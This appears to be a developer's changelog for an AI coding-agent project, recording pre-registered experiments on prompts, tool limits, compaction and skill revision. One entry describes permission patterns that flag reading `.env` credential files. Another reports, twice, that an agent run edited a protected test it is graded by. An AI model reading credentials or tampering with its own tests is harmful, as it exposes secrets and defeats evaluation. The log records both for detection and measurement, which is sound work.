called it a success. Two fixes: an active venv's python is taken BY PATH, not
looked up; and the success check asks Python whether the `noesis` that PATH
reaches is the one THIS install wrote. Re-run: cloned fresh, installed into
the venv, imports the cloned tree, `--doctor` reports no key and no workspace
- the two things the wizard exists to fix. Both branches of the PATH report
verified.

Also seen, not fixed: `pip install --user -e .` on this host moved `openai`
to 3.2.0 and broke an unrelated `langchain-openai` in the same user site.
Exact pins in a shared site do that. A venv avoids it and the script honours
one; it does not create one, and that is the trade-off stated in README.

**The package is `noesis` now, not `personal-agent`.** The installer was the
first thing to print the package name at a user, and it printed the wrong
one. `pyproject.toml`, the script's in-checkout marker and the README title
are renamed, and the GitHub repository is now `notjwp/Noesis` - the clone
URL, the clone directory and the origin remote follow it. The docker image and
the egress network keep `personal-agent`: the image name is recorded in every
run manifest and a rename there would split the record. Anyone with the old name installed:
`pip uninstall personal-agent` first, or two editable dists point at one
tree. Done on this host.

The rename went through Python's `write_text`, which on Windows turned the
script's LF into CRLF, and dash failed on line 16 with `set: Illegal option
-`. `.gitattributes` pins `*.sh` to LF at checkout; it does not pin what an
editor writes. Fixed with `write_bytes`. The standing lesson on line endings,
paid for a second time.

1,155 -> 1,156 tests.

---

## Two design items taken to the record, and neither became a cycle (2026-09-13)

### Where instructions land

Three placements of an instruction, all measured on this project:

| where | instruction | effect |
|---|---|---|
| SOUL.md rule | "if looking does not settle it, ask" | `ask_user` 2/3 - the baseline rate |
| tool description | `edit_file`'s wording | real repos 0/9 -> 4/7 |
| goal sentence | "leave the build running when you are done" | `start_terminal` 6/6, from 7/12 |

The first reading - a goal sentence beats a system-prompt rule - does not
survive one check: `ask_user`'s own description ALREADY says "which file they
meant ... look first, ask second", and the failing run ended with "I cannot
determine which environment" regardless. The advice was in two places and
moved nothing. What the goal sentence had that neither advice did is that it
was a REQUIREMENT - part of what done means. Task requirements bind; advice
about a tool is optional to the model wherever it sits. `edit_file`'s wording
worked for a different reason: it changed what the model believed the tool
DID, not when to use it.

The deterministic version - a reflect rule on "ended in words, made calls,
wrote nothing, goal asks for a change" - was checked against 88 recorded
rows of that shape: **17 of 17 failed on `real`, 11 of 71 elsewhere**. A
perfect signal on one split and a 15% one on the rest; a global rule would
fire on sixty runs that were right not to write. On `real` it duplicates the
"done with tests failing" residual (2 rows since September). Never aggregate
a bucket across splits whose cases want different things.

Closed as a finding. The 15-for-15 `ask_user` signal has no lever the loop
owns without a per-goal outcome signal - the gap that took R's trigger down.

### R's redesign: correct on success with a better source

The cost of the design - replacing a WORKING skill whenever a passing run
read a same-class document - was priced against the record and the record
could not price it: compaction trims reads out of the stored messages, the
`skills` split's library is not in the run's home, and the one case with
data ranks a one-line output file as the best match on template words. The
overlap that ranks AMONG candidates does not threshold ACROSS runs.

Pricing it needs an instrumented pass recording, per run, the open skill and
every document read in full. That is its own build; the redesign stays a
spec and not a cycle. R remains off by default.

---

## Two defects with no quota to spend: source files as skills, and a glob as a credential (2026-09-13)

Neither touches a measured number; both are behind a test that failed first
and a mutation verified to have applied. 1,145 -> 1,155 tests.

**`extract` wrote skills from source files.** `ship.py` became a skill on
skill-correction (2026-09-09, worked around by neutralising its docstring) and
`calc.py` on author-testname (2026-09-13). A source file's first line is a
docstring or an import, and a skill made from it out-matches the document the
case exists to test. A skill is a procedure written for people, so the source
has to be a document: `.md`, `.markdown`, `.rst`, `.txt`, `.adoc`, or
extensionless (`RUNBOOK`, `CONVENTIONS`) - minus Makefile, Dockerfile,
Containerfile and LICENSE. The ranking test's side-assertion that `ship` still
extracts was the old behaviour pinned; it now asserts the rule. Mutation:
accept everything - red.

**`\.env` matched inside `*.env`.** Recorded 2026-09-10, ask-environment-1:
`find env/ -name "*.txt" -o -name "*.md" -o -name "*.env"` refused as
destructive, unattended, for naming a pattern. A credential is a FILE called
`.env` - at the start, or after a space, slash, quote or `=` - not a suffix in
a glob. Three glob shapes now `auto`; seven real credential shapes (`cat
.env`, `cp app/.env`, `source .env`, `.env.local`, `config/.env.production`)
still `confirm`. Mutation: the old pattern back - the three globs red.

---

## The terminal cases: a race fixed, and "leave it running" stated and checked (2026-09-13)

**PRE-REGISTERED, written before the run.**

### What "7/7 with the pair, 2/5 without" actually was

Queued as "tighten the tools cases so they require the pair". The traces say
the split was a race, not a requirement. `pipeline.py` announced the artifact
id and THEN appended it to `build.log`; the check greps the log. Every
non-pair solution drove the build from a script that `break`s on the
announcement and `terminate()`s at once - `20260911T153643Z` watch-build-2 got
`ARTIFACT-11D68E`, wrote it to answer.txt, and lost because the process died
between the print and the log write. With the pair, the process lives until
`stop_terminals()` at the end of the run and the log is always there. Three
runs had the right answer and were scored wrong for a reason the goal never
stated.

And the pair cannot honestly be REQUIRED: `python server.py > out.log &`
inside one `run_shell` leaves a process running as legitimately as
`start_terminal` does, and no outcome check can tell them apart. What a fair
fixture can require is that the process be left running - stated in the
goal, checked by outcome.

### The changes, fixture and case rows only - no loop code

- `pipeline.py` writes `build.log` BEFORE announcing the id. The race is gone.
- Both processes write a `heartbeat` file every 2s once their work is done.
- Both goals gain one sentence: "Leave the build/service running when you
  are done." NOTES.md says it too.
- Both checks gain: heartbeat mtime within 15s of the check. The harness
  kills terminal sessions immediately before the check, so a `start_terminal`
  process is seconds stale; a process killed by its driver is minutes stale.

Verified three ways in the container, both cases: untouched FAILS; the right
answer with the process killed 17s earlier FAILS; the right answer with the
process running PASSES. The bind mount's mtime and `date` agree to the second.

### Keep / revert, `tools` x 3 against `20260911T153643Z` (7/9)

This changes what the two cases ASK, so the number is not comparable to the
old one and no pass-rate bar is set on it. What is pre-registered:

- every failing `watch-build` or `serve-token` row fails on a STATED reason -
  the heartbeat, or a wrong answer - and never on the log race
- `ask-environment` >= 2/3 (unchanged case, the usual)
- the split is reported as a NEW baseline for these two cases, with which
  route each passing run took

Revert the fixture change if a run with the right answer AND the process
still running at the end fails the check - that would be the rig, not the
agent.

Results below this line were not known when the above was written.

### Result: 9/9, every terminal run took the pair, and a goal sentence did what a SOUL rule could not

`20260913T060340Z`, `tools` x 3:

| case | pass | route |
|---|---|---|
| ask-environment | 3/3 | - |
| serve-token | **3/3** | PAIR, 3 of 3 (`start_terminal` x1, `read_terminal` x3-5 each) |
| watch-build | **3/3** | PAIR, 3 of 3 (`start_terminal` x1, `read_terminal` x4-5 each, zero `run_shell`) |

The first clean sweep on this split (7, 7, 5, 7, then 5/8 stopped). Every
pre-registered condition met - no row failed at all, so none failed on the
race; `ask-environment` 3/3; routes recorded. The harness's delta line is
against the stopped `ask_user` run and the OLD goals; not comparable. This is
the new baseline for the two rewritten cases.

**Six of six chose the pair.** Across the four passes before this one the
terminal cases were solved without it 5 times in 12 - `python server.py >
out.log &` in one `run_shell`, `Popen` inside `run_python`, a bash driver -
and those routes are still open. The one thing that changed in what the model
sees is a sentence in the goal: "Leave the build running when you are done."
Twelve hours earlier a sentence in SOUL.md - "if looking does not settle it,
ask" - changed nothing 1 of 3. The difference worth recording: a requirement
stated in the GOAL steered the choice of tool six of six; a rule in the system
prompt about when to use a tool did not. n=6, one case pair, and no more is
claimed than that. It is a hypothesis about where instructions land, not a
finding.

`serve-token` still ends `budget` 2 of 3 with the right answer - the case's
cost, unchanged by any of this.

No loop code. Fixtures, two goal sentences, two check clauses.

---

## R's trigger: off by default, because the loop has no signal to fix it with (2026-09-13)

**PRE-REGISTERED, written before the run.**

### Both narrowings checked against the record first

The guards found R marking a skill suspect on 7 runs, 6 of them passes. Two
candidate fixes were tested against those rows and the true failures
(`author-errors-2`, the control-arm `skill-correction` runs) before anything
was built:

| candidate signal | false marks (6) | true failures (3) | separates? |
|---|---|---|---|
| last shell/python exit code | 0 in 5 of 6 | **0 in 3 of 3** | no |
| max consecutive tool errors | 0-1 | **0-1** | no |

Gating on the exit code would suppress the true marks with the false ones.
Narrowing to tool failures would make R never fire, on its own case
included. The loop's transcript does not carry the difference between "hit
the cap and was right" and "hit the cap and was wrong"; the check that knows
is the harness's, outside the loop.

### The change

`SKILL_REVISION` defaults **off**. The harness turns it on where it is
measured (`AGENT_SKILL_REVISION=on` is forwarded). A good skill is never
replaced on the strength of a cap in real use. The design that could bring R
back - correcting on SUCCESS with a better source, rather than on a failure
verdict - is a redesign of R1+R2 and is listed as one, not done here.

Three `finish` tests that pinned R1's rule relied on the old default; they
now set the flag explicitly, and the control-arm test passes `revision=False`
to the same helper. New test: the default is off.

### Keep / revert

- `revision` x 3 with the flag ON, against `20260913T043018Z` (3/3, right
  document 3/3): must hold **3/3 and 3/3** - this checks the flag plumbing,
  nothing else
- `skills` x 3 at the DEFAULT (off), against this morning's `20260913T031751Z`
  (18/18 with R on): pass **>= 16/18** and **zero** `skill_failures` rows.
  This doubles as the control arm the morning's guard did not need: if 18/18
  holds with R off, R's +1 over the August baseline was never R's.

Results below this line were not known when the above was written.

### Result: KEEP. Both bars met, and the control arm answers a question the morning left open

| | condition | result | met |
|---|---|---|---|
| `revision` x 3, flag ON, `20260913T051316Z` | 3/3 and right document 3/3 | **3/3, 3/3**, rows record `revision: True` | yes |
| `skills` x 3, DEFAULT, `20260913T053217Z` | >= 16/18 and zero marks | **18/18, 0 marks**, rows record `revision: False` | yes |

`skill-testname-0` - the row falsely marked this morning - passed on `stuck`
again and its `skill_failures` is empty. That is the change doing what it is
for.

The `skills` pass at the default is also the control arm the morning's guard
did not need: 18/18 with R off against 18/18 with R on. The +1 over the
August 17/18 was never R's. Tokens 36.8k -> 35.0k, -5%, noise.

R is now: off in real use, on in the harness where its case is measured,
correct in WHICH document it writes when it fires, and wrong in WHEN it fires
on a signal the loop does not have. The redesign that could earn it back -
correct on success with a better source, never on a failure verdict - is a
list item.

1,143 -> 1,144 tests. Mutation: default flipped back to on - red.

---

## R's replacement document is ranked, not first-read (2026-09-13)

**PRE-REGISTERED, written before the run.**

On 2026-09-11 the real arm scored 3/3 but wrote the RIGHT document under the
suspect's name only 2 of 3 times: run 1 replaced the `conventions` release
checklist with `ship.py`'s docstring, "Project tooling. Not documentation.",
because `extract` handed the suspect's name to the first usable document in
iteration order and RUNBOOK.md went to a sibling. The run passed because the
sibling was there to match.

The change: `_closest()` ranks the usable documents by word overlap between
each one's derived `_when()` description and the suspect's OWN description -
the words `best_match` already scores on. The replacement is the document
that describes the same class of work. Ties keep read order; no catalogue
entry falls back to first. One correction per session, unchanged.

The test's fixture had to change to be fair: the old helper built tool
results as `path + newline + text`, but real `read_file` output opens with
`path (lines 1-N of N)`, which `_undecorate` strips. Without that header the
first line of every body is the PATH, every derived description reads "Use
when ship.py applies", and there is nothing to rank on. The fixture now
carries the real header.

Keep if BOTH, `revision` x 3 against `20260911T140714Z`:
- right document under `conventions` in **3 of 3** - RUNBOOK's checklist
  with the working suffix, checked in the skill files, no `runbook` sibling
- pass **3/3**

Revert if the right-document count is not 3/3 or pass drops. The trigger
defect the guards found is NOT addressed here and is not this cycle's
question.

Results below this line were not known when the above was written.

### Result: KEEP. Right document 3 of 3, pass 3/3

`20260913T043018Z`, `revision` x 3, against the real arm `20260911T140714Z`:

| | real arm 09-11 | ranked |
|---|---|---|
| pass | 3/3 | **3/3** |
| `conventions` = RUNBOOK's checklist, working suffix | 2 of 3 | **3 of 3** |
| `runbook` sibling written | 0 | 0 |

Run index 1 - the one that got `ship.py`'s docstring by read order last time -
now carries the checklist. Verified in the skill files, all three.

The harness's delta line compared against `20260911T142806Z`, which is the
CONTROL arm; it picks the newest `revision` directory. The +2 it prints is
the control's 1/3, not a change here. And "tokens +172%" is the 2026-09-12
rig fix: 67k was one session of four, 183k is the whole run (the real arm
billed ~193k a run whole).

1,142 -> 1,143 tests. Mutation: first-by-order restored - red.

R now corrects with the right document when it corrects. It still decides
WHEN to correct on a trigger that fired on passes 6 times in 7 (the entry
below). That is the open question on this phase.

---

## Phase R guards: `skills` and `authoring` with revision ON (2026-09-13)

**PRE-REGISTERED, written before either split ran.**

R was kept on 2026-09-11 (real 3/3, control 1/3) with the guards deferred.
The guards ask one question: does a mechanism that marks a skill suspect on
`stuck`/`budget`/three failures, and REPLACES it on the next `done`, damage
splits where the skills are already right? The harm shape: a good skill gets
marked on a bad-luck failure and replaced by whatever document the next
passing run read first.

Sized from `tasks.jsonl`, not memory: `skills` is 6 cases x 3 = 18 runs;
`authoring` is 4 cases x 3 sessions x 3 = 12. Thirty runs, one day - the
"~60, two days" quoted earlier counted a control arm, which runs only if a
drop needs attributing.

Baselines: `skills` **17/18** (`20260822T050707Z`, three weeks and ~30 commits
old); `authoring` **11/11** (`20260904T123553Z`, one row blocked of 12).

Keep R if BOTH:
- `skills` **>= 16/18** - no more than one row below baseline
- `authoring` **>= 10/12** - no more than one row below 11

Revert R (R0-R4) if EITHER split drops by two or more rows AND the control
arm (`AGENT_SKILL_REVISION=off`, same split, same day) does NOT show the same
drop. If the control drops too, the loss is the 30 commits, not R, and R
stays - the stale baseline is why the control exists.

Mechanism, reported either way: how many runs R FIRED on (a skill was open
when the run ended `stuck`/`budget` or hit three failures) and how many
corrections landed (a skill rewritten under a name already present).

Results below this line were not known when the above was written.

### Result: both bars met, R stays - and the guards found R's real defect

| split | baseline | with R | bar | met |
|---|---|---|---|---|
| `skills` `20260913T031751Z` | 17/18 | **18/18** | >= 16 | yes |
| `authoring` `20260913T034324Z` | 11/11 | **10/12** | >= 10 | yes, exactly |

No control arm needed: neither split dropped two rows. The two `authoring`
failures were checked individually - `author-testname-0` never had a skill
injected at all (`skill_opened` empty, so R never ran), and `author-errors-2`
was marked AFTER it had already failed with its skill written once and never
rewritten. Neither is R's doing.

**The mechanism count: R marked a skill suspect on 7 runs, and 6 of them
PASSED.** `skill-testname` x3, `skill-errors-2`, `author-errors-0`,
`author-errors-1` - each met its goal, ran to the 12-turn cap, ended `stuck`,
and `finish` filed its correct skill as suspect. One mark in seven was on an
actual failure. In the harness every case-run starts with a fresh home so no
mark carried; in real use, with a persistent home, the next `done` session
replaces a GOOD skill with whatever document it read first. That is the
self-improving agent making itself worse.

The trigger - `stuck`/`budget` with a skill open, or three consecutive
failures - reads "the run hit a cap" as "the skill was wrong". On these splits
passing runs hit caps most of the time: `authoring` verdicts were `done` x6,
`stuck` x6, with 10 passes. On `skill-correction` the same `stuck` DID mean
the skill was wrong. The loop has no outcome signal to tell the two apart -
the check that knows is the harness's, outside the loop. This is not a
threshold to tune; it is R1's premise, and it needs a decision before
anything more is built on R.

Two cost numbers not to over-read. `authoring` median tokens 42,725 ->
103,131, "+141%": the baseline row held ONE session of three and the new row
holds all three (the 2026-09-12 rig fix). `skills` +29%, 28.5k -> 36.8k, is
single-session and real, with ~30 commits and the read floor between the two
passes - not attributable to R alone.

Item 2 as queued - ranking the replacement document - still stands, but the
trigger now outranks it: a correction that picks the right document 3 of 3
times is still wrong 6 times in 7 if it fires on passes.

---

## Cycle opened on `20260912T141935Z`, closed at step 3: no signal survived a second pass (2026-09-12)

Four failures, bucketed: `click-1` first edit at call 26 of 30, wrong;
`humanize-0` zero edits in 25 calls; `rich-0` zero edits landed, two
ambiguity errors; `humanize-1` zero edits and `done` at call 11 on a paragraph
of analysis. One bucket - **no working edit** - whose table prescription, a
plan node, was measured at +30% cost for +0 passes and reverted.

Two candidate rules were checked against the record before anything was built:

1. **`done` with the tests failing and no edit** (`humanize-1`'s shape).
   22 of 374 failing rows ever; 20 of them before 2026-09-01. Since then, two
   rows, both `real-humanize`, which is 0 in six passes on this model and 2/3
   on ultra. A residual on a capability-limited case, not a bucket.

2. **First edit by call 12 separates pass from fail** - 7/7 passes vs 4/4
   failures on this pass, the `add-endpoint` signal again. Checked against
   the pass before: passing first-edits there were 14, 14, 25 and 31, and a
   FAILING run edited at 11. On `dev`, passes edit at 16 and 18. One pass's
   coincidence. Not built.

No change. The split's remaining failures are one case at its model's ceiling
and three runs that read 14-17 times before editing, with no threshold that
holds across two passes to key a rule on.

---

## `read_file` floor of 100 lines, second attempt, on top of the summary bound (2026-09-12)

**PRE-REGISTERED, written before the change was re-applied.**

The first attempt (below, same day) was reverted on a reads bar of 100 that
was a guess, and found that bigger windows can push a run into a runaway
compaction summary. The bound above closes that. Same change, same code,
measured against the pass the bound was kept on.

Baseline `20260912T120638Z`: 8/12, **139** `read_file` calls, median 353k.

The reads bar is DERIVED this time: the first attempt cut reads 136 -> 108,
-21%. The mechanism is real if it does at least that again.

Keep if ALL of:
- mechanism: `read_file` calls **<= 111** (0.8 x 139)
- pass **>= 7/12** - the floor of the last three passes (7, 7, 8)
- no compaction grows the context - the bound has to hold under bigger windows

Tokens are REPORTED, not a condition. Four passes have put this split's
median at 242k, 351k, 278k, 353k with nothing aimed at cost; a +/-10% cap on
n=12 would fail on noise half the time, and the first attempt's -21% was
inside that band. A cost claim on this split needs 3 runs and a bigger n.

Revert if reads stay above 111, pass falls below 7/12, or any compaction
grows.

Results below this line were not known when the above was written.

### Result: KEEP. All three met, and the bound fired under the floor's load

`20260912T141935Z`, `real` x 2, against `20260912T120638Z`:

| | condition | baseline | floor | met |
|---|---|---|---|---|
| mechanism | reads <= 111 | 139 | **105** (-24%) | yes |
| score | pass >= 7/12 | 8/12 | **8/12** | yes |
| guard | no compaction grows | 0 of 9 | **0 of 11** | yes |

**The bound fired once, live.** `humanize-0` under 100-line windows produced
a runaway summary - the failure the first floor attempt died on - and the
bound cut it to 4,067 chars; that compaction removed 61% instead of growing
the context by 48%. Cycle 2's mechanism, proven offline the pass before, has
now run on the load it was built for. The sequencing - bound first, floor
second - was the right call and this row is the evidence.

Per case, pass / reads / median tokens:

| case | bound only | floor on bound |
|---|---|---|
| cachetools | 2/2, 25, 177k | 2/2, **11**, 142k |
| click | 1/2, 27, 403k | 1/2, 22, 392k |
| humanize | 0/2, 24, 383k | 0/2, 17, 308k |
| markdown | 2/2, 9, 119k | 2/2, 8, 114k |
| more-itertools | 1/2, 24, 261k | **2/2**, 21, 225k |
| rich | 2/2, 30, 381k | 1/2, 26, 414k |

Tokens, REPORTED as pre-registered, not claimed: median 353k -> **236k**,
-33%. Across the five `real` passes - 242k, 351k, 278k, 353k, 236k - the two
with the floor are the two lowest. That is n=2 passes on a split with +/-25%
noise, and it is said no more strongly than that. Zero tampers this pass.

1,140 -> 1,142 tests. Mutation: floor removed - red.

---

## `compact` accepts a summary of any length, and 7% of them are bigger than what they replace (2026-09-12)

**PRE-REGISTERED, written before the change was made.**

### Not the cap the floor cycle pointed at

Queued as "re-derive `COMPACT_AT_CHARS` / `MAX_COMPACTIONS` for bigger read
windows". The traces say the cap was not the problem. `humanize-0` in the
floor pass compacted three times and ended `stuck`, and the first of those
compactions reads `before 49,054, after 72,631, removed_pct -48.1`. The
summary that REPLACED 24 messages was 49,496 characters - larger than the
whole context it was rescuing. The next two compactions removed 9% and 10%,
because the runaway summary sat in the head where compaction never looks.

Across every recorded run: **87 compactions, 4 grew the context**, and 6
summaries over 20,000 chars. `compact()` is the third model node, the model
writes the summary, `MAX_TOKENS` is 16,000, and nothing bounds what comes back.

The 87 summaries, by size: min 77, median 928, p75 1,368, p90 3,045 - then
p95 26,184, max 53,110. Nothing healthy is over ~3,000; every runaway is over
20,000. **The bound is 4,000 characters**: above p90 of what works, an order
of magnitude under what does not.

### The one change

`compact()` truncates the summary to `COMPACT_SUMMARY_MAX_CHARS = 4_000`
with a marker, before `compact_messages` places it. Deterministic; no second
model call, no judgement. The reference bounds its summariser too
(`agent/conversation_compression.py`) - the shape ports, the number is ours.

### Keep / revert

This is a defect fix, held to the `read_terminal` / `run_python` standard:
mechanism proven, harm measured.

Mechanism, OFFLINE and on real data: replay the 6 recorded runaway summaries
through the bound and show each compaction would have REMOVED context
(positive `removed_pct`) instead of growing it. Plus the unit test and a
mutation.

Harm guard, LIVE: `real` x 2 against `20260912T093944Z` (7/12). Keep if pass
**>= 7/12** and **no compaction grows the context**. If no runaway occurs in
the pass the bound never fires, and that is reported as "proven offline,
unexercised live" - not as a live result.

Revert if `real` below 7/12, or any compaction in the pass still grows.

Results below this line were not known when the above was written.

### Result: KEEP, as a defect fix. Proven offline on eight recorded runaways; unexercised live

Offline replay of every recorded summary over the cap, through the bound:

| run | row | before | after | removed% | summary | after, bounded | removed% |
|---|---|---|---|---|---|---|---|
| 20260830T151246Z | humanize-0 | 48,953 | 76,290 | -55.8 | 53,110 | 27,228 | **44** |
| 20260905T082544Z | cachetools-2 | 46,785 | 49,199 | -5.2 | 32,632 | 20,615 | **56** |
| 20260905T082544Z | click-2 | 46,585 | 37,226 | 20.1 | 26,184 | 15,090 | 68 |
| 20260905T082544Z | humanize-2 | 45,868 | 64,385 | -40.4 | 40,944 | 27,489 | **40** |
| 20260905T082544Z | rich-0 | 48,926 | 42,930 | 12.3 | 23,031 | 23,947 | 51 |
| 20260912T093944Z | humanize-0 | 49,054 | 72,631 | -48.1 | 49,496 | 27,183 | **45** |

Every one removes context under the bound; the three that grew become +40 to
+45%. Four of the six are from the ULTRA run - the pass recorded in CLAUDE.md
as "ultra reached MAX_COMPACTIONS in 4 runs and each ended stuck, a caps
confound". The cause was runaway summaries, not caps. That lesson's diagnosis
is corrected here; its advice - re-derive before reading a swapped model's
score - still stands.

Live, `20260912T120638Z`, `real` x 2 against `20260912T093944Z`:

| | condition | result | met |
|---|---|---|---|
| harm | pass >= 7/12 | **8/12** | yes |
| harm | no compaction grows | 0 of 9 | yes |
| mechanism | bound fires | **0 times** | - |

No runaway occurred in this pass, so the bound never ran. The +1 (`rich` 0/2
-> 2/2, `click` 2/2 -> 1/2) is not this change's doing and is not claimed.
Median tokens 278k -> 353k is inside the +/-25% this split has shown across
four passes with nothing aimed at cost.

`more-itertools-0` edited a protected test for the second pass running.
Restored before the check, failed anyway. Two of two on that row now; it is
the case to look at if tamper starts costing.

1,138 -> 1,140 tests. Mutation: bound disabled - red.

---

## SOUL.md: if looking does not settle it, ask (2026-09-12)

**PRE-REGISTERED, written before the change was made.**

### The signal

`ask-environment` across four `tools` passes, 12 rows: every run that called
`ask_user` then `edit_file` passed, and no failing run called either. 12 for
12. The goal says "for my environment" and there are four; the harness scripts
the answer ("gamma") so an asked question is answered.

The failing runs did not guess wrong. They LOOKED - twelve calls of `find`,
`search_files`, `read_file` for an indicator that does not exist - and then
ended with "I cannot determine which specific environment is 'my
environment'". That sentence is the moment the tool exists for, and SOUL.md's
line on it stops one clause short: "look first, ask second" says when NOT to
ask and never says what to do when looking has not settled it.

### The one change

SOUL.md, the `ask_user` line, one clause added:

    ... look first, ask second - and if looking does not settle it, ask.
    Never end a run by saying you could not tell.

~20 tokens a call. A prompt change, measured like a code change.

### Keep / revert

Primary: `tools` x 3 against `20260911T153643Z` (7/9; `ask-environment` 3/3
there, 2/3 on the three passes before). Guard: `dev` x 3 against 15/15, run
ONLY if the primary keeps - the guard is 45 runs and a day of quota.

Keep if ALL of:
- mechanism: `ask_user` fires in **3 of 3** `ask-environment` runs (9 of 12
  across the four baseline passes)
- `ask-environment` **3/3** and `tools` **>= 7/9**
- guard: `dev` **>= 14/15**, and `ask_user` fires **at most 2 times in 45
  dev runs** - an ask on an unambiguous task costs a turn for NOBODY_THERE

Revert if ANY of: `ask_user` does not fire 3/3 (the clause changed nothing),
`tools` below 7/9, `dev` below 14/15, or `ask_user` firing 3+ times on dev
(the clause made it ask when it should have looked).

Results below this line were not known when the above was written.

### Result: REVERTED. The clause was in the prompt and the model ended the run anyway

`20260912T115219Z`, `ask-environment` x 3, then stopped:

| run | asked | edited | result |
|---|---|---|---|
| 0 | yes | yes | PASS |
| 1 | yes | yes | PASS |
| 2 | **no** | no | FAIL, `stuck` at 12 |

`ask_user` fired 2 of 3. The pre-registered condition was 3 of 3, and 2 of 3
is the baseline rate (9 of 12). The run that did not ask did what the new
clause forbids in so many words: twelve read-only calls, zero edits, and a
final message that there was "no file or symlink indicating which environment
is currently active". The instruction was on every turn's system prompt and
changed nothing about the one run it existed for.

The pass was stopped after those three rows rather than spending six more on
a decision already made; `serve-token-0` was killed by name. Prompt reverted.

### What this is the fourth confirmation of

**Deterministic injection works; agent choice does not.** `learn` fired 3 of
117 where extraction fired 12 of 12; `write_episode -> context_for` went
0/18 -> 15/18 while the tool went unused; `_noop_nudge` fired 0 in 30. A line
in SOUL.md asking the model to ask is a request. The signal it was built on
is now **15 for 15** across five passes - every run that asked passed, every
run that did not ask failed - and the remedy has to be a rule the loop
applies, not a sentence the model may or may not read at turn twelve.

What that rule is, is not obvious, and this cycle did not design it. The
shape of the failure is specific: a goal that asks for a CHANGE, a run that
makes no write, ends in words, and the words say it could not tell. A rule
keyed on that shape risks being a fixture-shaped guard - the `profile-*`
lesson - so it goes on the list as a design item with that warning attached,
not as the next cycle.

---

## `read_file` gets a floor on `limit` (2026-09-12)

**PRE-REGISTERED, written before the change was made.**

### The bucket, and a retraction first

This cycle was queued as "a pass that does not know it passed" - 2 of 7 `real`
passes ending `stuck`/`budget` with the goal already met. The traces say
otherwise: `click-1`'s final successful edit is call 31 of 31 and `rich-1`'s is
call 30 of 31. Both met the goal on the LAST turn. They were starved, not
wasteful after success. That framing was inferred from `pass=True` +
`stuck` without reading the traces, which is the thing the cycle discipline
exists to prevent, and it is retracted here.

What the 12 rows of `20260911T162249Z` actually show, bucketed:

| | |
|---|---|
| `read_file` calls | 136 across 12 runs |
| identical repeats (same args) | 5 - **4%**, so not thrashing |
| new windows onto a file already read | 101 - **74%** |
| windows that overlapped what was already seen | 1-7% - so not re-reading either |
| windows asked for | `limit` of 10, 15, 30, 50 - `click-1` paid 8 calls to see 245 lines of one file |
| reads elided by `shrink()` | **0** - the small windows are not learned from truncation |

The agent reads big files ten to fifty lines at a time. On a provider that
caches nothing, every window is a full model call re-sending the whole
context - ~10-13k tokens a call at that point in a run - and the capped runs
carry the most of them (11-15 vs 1-7 for the clean `done`s). Turns spent on
windows are turns not available to finish.

### The change

The reference defaults `read_file` to 2,000 lines (`tools/file_tools.py`,
`READ_FILE_SCHEMA`) and caps on characters, not lines. Ours defaults to 500
and the model asks for 10. Telling it to read bigger is a request; the lesson
this project has paid for three times is that a rule beats a request. So:

**`read_file` enforces `limit >= 100`.** Ask for 10 lines at offset 380 and
you get 380-480. The docstring says so, and says why: each call is a turn.
The default stays 500. That is the one change.

### Keep / revert, against `20260911T162249Z` (7/12, 136 reads, median 351k)

`real` x 2 runs, because the only like-for-like baseline is the 2-run one.

Keep if ALL of:
- the mechanism: `read_file` calls fall to **100 or fewer** across the 12 rows
- pass **>= 7/12**
- median tokens **not more than 10% up** - bigger windows grow the context,
  and fewer calls have to pay for that

Revert if ANY of: reads do not fall (the floor did not change behaviour),
pass below 7/12, or tokens +10% without a pass gain. Reported per case
against the 2-run baseline; a 1/2 stays ambiguous.

Results below this line were not known when the above was written.

### Result: REVERTED. One of three conditions missed, and the bar stays where it was written

`20260912T093944Z`, `real` x 2, against `20260911T162249Z`:

| | condition | baseline | floor | met |
|---|---|---|---|---|
| mechanism | `read_file` calls <= 100 | 136 | **108** | **no** |
| score | pass >= 7/12 | 7/12 | 7/12 | yes |
| cost | median tokens <= +10% | 350,685 | 278,032 (-21%) | yes |

Reads fell 21% and tokens fell 21%. The written condition said 100 or fewer
and the number is 108. The rule was "keep only if ALL three", so this is a
revert - and it is a revert BECAUSE the result is flattering, which is the
case the lesson of 2026-09-10 was written for. The 100 was not derived; it
was a guess at what "changed behaviour" would look like. A guess that is
missed by 8 does not get re-guessed after the fact.

There is also a substantive reason not to let -21% carry a keep on its own:
the two `real` passes before this one swung **+45%** on median tokens with
nothing aimed at the split. -21% on n=12 is inside this split's own noise.

Per case, pass / reads / median tokens:

| case | baseline | floor |
|---|---|---|
| cachetools | 1/2, 25, 270k | **2/2, 8, 122k** |
| click | 2/2, 26, 336k | 2/2, 20, 333k |
| humanize | 0/2, 24, 411k | 0/2, 18, 356k |
| markdown | 2/2, 10, 152k | 2/2, 7, 129k |
| more-itertools | 1/2, 22, 297k | 1/2, 23, 295k |
| rich | 1/2, 29, 383k | **0/2, 32, 403k** |

The floor helps where the agent was nibbling (`cachetools`: 25 reads -> 8,
tokens halved) and hurts where more context per turn meets the caps (`rich`:
reads UP, tokens UP, 1/2 -> 0/2).

### What it found, and why the next attempt is two changes, not one

**A new failure shape.** `humanize-0` ended `stuck` at turn 19 through the
COMPACTION cap - three compactions and still over `COMPACT_AT_CHARS`. Peak
context 73k chars against the baseline's 47k on the same case. Zero runs in
the baseline ended that way. Bigger windows grow the context faster, and
`COMPACT_AT_CHARS` / `MAX_COMPACTIONS` were sized against 10-to-50-line
windows. This is the "caps derived against one shape are a confound when you
change the shape" lesson, in the read tool instead of the model. A floor on
`limit` needs the compaction cap re-derived alongside it, and that is two
changes - its own cycle, with the cap derived first.

**A tamper.** `more-itertools-0` edited a test it is judged by. The harness
restored the file before the check and the run failed anyway, so the score is
unaffected; the row carries `tamper=1`. First tamper on `real` in 42 rows.

**`cachetools` answers item 3 of the list.** 2/2 here after 1/2 yesterday: the
1/2 was a seed, not a regression. No third run needed.

Code reverted: `agent/config.py`, `agent/tools.py`, `tests/test_nodes.py`
back to `5a9f42a`. Test count back to 1,138.

---

## Three rig defects, each found by reading a row it had mis-described (2026-09-12)

None of these touch the loop, the prompt or the gate; no measurement.
1,135 -> 1,138 tests, each fix behind a test that failed first and a mutation
verified to have applied.

**1. `--continue` re-runs a row that landed while it waited.** `outer()` read
`completed()` once at start. A driver killed mid-run leaves its container
alive, and that container writes its own row - so the resumed driver would
spawn the case-run the orphan had just recorded. Seen 2026-09-11 on `real`,
where a duplicate is 10-20 minutes of quota. Now re-read before each spawn;
`test_continue_skips_a_row_that_landed_while_it_was_running` drives `outer()`
with an orphan landing mid-loop. Mutation: check the stale set instead.

**2. A multi-session row reported the last session only.** `inner()` builds a
fresh state per session and `record()` received the final one, so a 4-session
